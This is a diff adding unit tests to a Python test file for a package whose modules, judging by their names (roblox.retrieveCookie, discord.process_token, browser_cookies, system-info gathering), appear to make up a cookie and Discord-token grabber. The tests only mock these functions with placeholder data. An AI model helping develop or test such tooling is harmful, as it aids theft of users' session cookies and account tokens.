@@ -22,7 +22,7 @@ formatter = ColoredFormatter()
 handler.setFormatter(formatter)
 logger.handlers = [handler]
 
-from src.python_package import misc, computer
+from src.python_package import misc, computer, discord, browser_cookies, roblox
 
 class TestSystemInfo(unittest.TestCase):
 
@@ -177,6 +177,57 @@ class TestSystemInfo(unittest.TestCase):
         all_info = misc.getallinfo()
         self.assertIsInstance(all_info, dict)
         logger.info('test_miscallinfos OK')
+    
+    @patch('src.python_package.roblox.retrieveCookie')
+    def test_robloxretrievecookie(self, mock_retriveCookie):
+        cookie = roblox.retrieveCookie()
+        self.assertIsInstance(cookie, str)
+        logger.info('test_robloxretrievecookie OK')
+
+    @patch('src.python_package.roblox.retrieveCookie')
+    def test_roblox_retrieve_cookie(self, mock_retrieveCookie):
+        # Set up the mock to return a non-None value
+        mock_retrieveCookie.return_value = "mocked_cookie_value"
+        # Call the function and assert it does not return None
+        self.assertIsNotNone(roblox.retrieveCookie())
+        logger.info('Test Roblox Retrieve Cookie PASSED')
+
+    @patch('src.python_package.discord.process_token')
+    def test_process_token(self, mock_process_token):
+        # Mock a token and its return value
+        mock_process_token.return_value = {
+            "username": "TestUser#1234",
+            "userid": "123456789012345678",
+            "email": "test@example.com",
+            "phone": None,
+            "twofa": True,
+            "hasnitro": False
+        }
+        # Make sure it processes the mocked token
+        token_info = discord.process_token("mocked_token")
+        self.assertIsNotNone(token_info)
+        self.assertIn("username", token_info)
+        logger.info('Test process_token PASSED')
+
+    @patch('src.python_package.discord.get_common_infos')
+    def test_get_common_infos(self, mock_get_common_infos):
+        # Set the return value for the mocked common info function
+        mock_get_common_infos.return_value = [
+            {
+                "username": "User1#1111",
+                "userid": "111111111111111111",
+                "email": "user1@example.com",
+                "twofa": False,
+                "hasnitro": True
+            }
+        ]
+        
+        tokens = ["mocked_token_1", "mocked_token_2"]
+        common_infos = discord.get_common_infos(tokens)
+        self.assertIsNotNone(common_infos)
+        self.assertIsInstance(common_infos, list)
+        self.assertGreater(len(common_infos), 0, "Common info list should not be empty")
+        logger.info('Test get_common_infos PASSED')
 
 if __name__ == '__main__':
     unittest.main()
